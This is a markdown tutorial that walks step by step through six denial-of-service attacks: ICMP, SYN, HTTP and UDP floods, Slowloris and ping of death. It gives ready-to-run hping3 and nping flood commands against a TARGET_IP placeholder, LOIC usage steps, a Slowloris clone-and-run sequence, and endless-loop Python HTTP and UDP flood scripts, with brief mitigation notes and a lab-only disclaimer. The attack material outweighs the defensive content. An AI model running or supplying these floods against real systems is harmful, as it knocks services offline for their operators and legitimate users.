```markdown
# Complete Guide to DoS Attacks

---

## ⚠️ Disclaimer

**This guide is for educational purposes only**. Unauthorized use of these techniques to attack systems, networks, or individuals is illegal and punishable by law. Use this guide only in a lab environment or with explicit permission.

---

## 📖 What is a DoS Attack?

A **Denial of Service (DoS)** attack aims to overwhelm a target, such as a server, network, or service, with traffic or resource requests, rendering it unavailable to legitimate users.  

Unlike Distributed DoS (DDoS), a DoS attack uses a single source to launch the attack.

---

## 🚀 Step-by-Step Guide to Performing DoS Attacks

### Prerequisites

1. **Lab Environment**  
   - Use a virtualized or isolated network for testing.
   - Set up a target machine (e.g., a web server or application).
   - Ensure all activities comply with the law and ethical guidelines.

2. **Tools to Install**
   - `hping3`
   - `LOIC (Low Orbit Ion Cannon)`
   - `Slowloris`
   - `Nmap`
   - Any other DoS tools (ensure they are ethical and authorized).

3. **Linux Command Line Knowledge**
   Basic command-line skills are required to use tools effectively.

---

## 🔧 Types of DoS Attacks and How to Perform Them

### 1. **ICMP Flood (Ping Flood)**

**Description:** Overloads the target by sending a large number of ICMP Echo requests (pings).

#### Steps:
1. **Install `hping3`:**
   ```bash
   sudo apt install hping3
   ```
2. **Run an ICMP Flood:**
   ```bash
   hping3 -1 --flood TARGET_IP
   ```
   - `-1`: ICMP mode.
   - `--flood`: Send packets as fast as possible.

#### Mitigation:
- Block ICMP traffic using a firewall.
- Limit the rate of ICMP responses.

---

### 2. **SYN Flood**

**Description:** Exploits the TCP handshake by sending a large number of SYN packets, leaving the target unable to process legitimate connections.

#### Steps:
1. **Run a SYN Flood with `hping3`:**
   ```bash
   hping3 -S -p 80 --flood TARGET_IP
   ```
   - `-S`: SYN flag.
   - `-p 80`: Target port (HTTP in this example).

2. **Alternative with `nping` (part of Nmap):**
   ```bash
   nping --tcp -p 80 --rate 1000 TARGET_IP
   ```

#### Mitigation:
- Enable SYN cookies on the server.
- Use rate-limiting tools like `iptables`.

---

### 3. **HTTP Flood**

**Description:** Sends numerous HTTP GET or POST requests to overload the target’s web server.

#### Steps:
1. **Using `LOIC`:**
   - Download and install LOIC: [GitHub - LOIC](https://github.com/NewEraCracker/LOIC).
   - Enter the target's IP or URL and choose **HTTP Mode**.
   - Start the attack.

2. **Using Python Script (HTTP GET Flood):**
   ```python
   import requests

   target = "http://TARGET_IP"
   while True:
       try:
           requests.get(target)
       except:
           pass
   ```
   - Run this script in a loop to flood the target.

#### Mitigation:
- Use a Web Application Firewall (WAF).
- Block suspicious IP addresses.

---

### 4. **Slowloris Attack**

**Description:** Keeps multiple connections to the web server open for as long as possible, exhausting server resources.

#### Steps:
1. **Install `Slowloris`:**
   ```bash
   git clone https://github.com/gkbrk/slowloris.git
   cd slowloris
   python3 slowloris.py TARGET_IP
   ```

#### Mitigation:
- Limit the number of connections per IP.
- Use a load balancer.

---

### 5. **UDP Flood**

**Description:** Overloads the target by sending large amounts of UDP packets.

#### Steps:
1. **Run a UDP Flood with `hping3`:**
   ```bash
   hping3 --udp -p 80 --flood TARGET_IP
   ```
   - `--udp`: Send UDP packets.

2. **Using Python (UDP Flood):**
   ```python
   import socket

   target = "TARGET_IP"
   port = 80
   data = b"X" * 1024
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   while True:
       s.sendto(data, (target, port))
   ```

#### Mitigation:
- Block UDP traffic using a firewall.
- Use tools to detect abnormal traffic patterns.

---

### 6. **Ping of Death**

**Description:** Sends malformed or oversized packets to crash the target system.

#### Steps:
1. **Run with `hping3`:**
   ```bash
   hping3 -d 65500 -1 TARGET_IP
   ```
   - `-d`: Packet size (oversized packets).

#### Mitigation:
- Ensure systems are updated with the latest patches.
- Block oversized ICMP packets.

---

## 🛡️ Best Practices for Mitigation

1. **Firewalls and Rate Limiting**  
   - Use `iptables` to block or limit traffic.
   - Example:
     ```bash
     sudo iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 -j DROP
     ```

2. **Load Balancers**  
   - Distribute traffic across multiple servers.

3. **Use a CDN**  
   - Services like Cloudflare can help absorb traffic.

4. **Monitoring Tools**  
   - Use tools like `Wireshark`, `Zabbix`, or `Nagios` to monitor traffic and detect anomalies.

---

## 📦 Resources and Tools

- [Official Nmap Site](https://nmap.org)
- [LOIC on GitHub](https://github.com/NewEraCracker/LOIC)
- [OWASP DoS Guide](https://owasp.org/www-community/attacks/Denial_of_Service)

---

## ✍️ Final Note

This guide provides a foundation for understanding and simulating DoS attacks in an ethical, legal, and controlled environment. Always ensure you have permission to test the systems you work on.

---
```
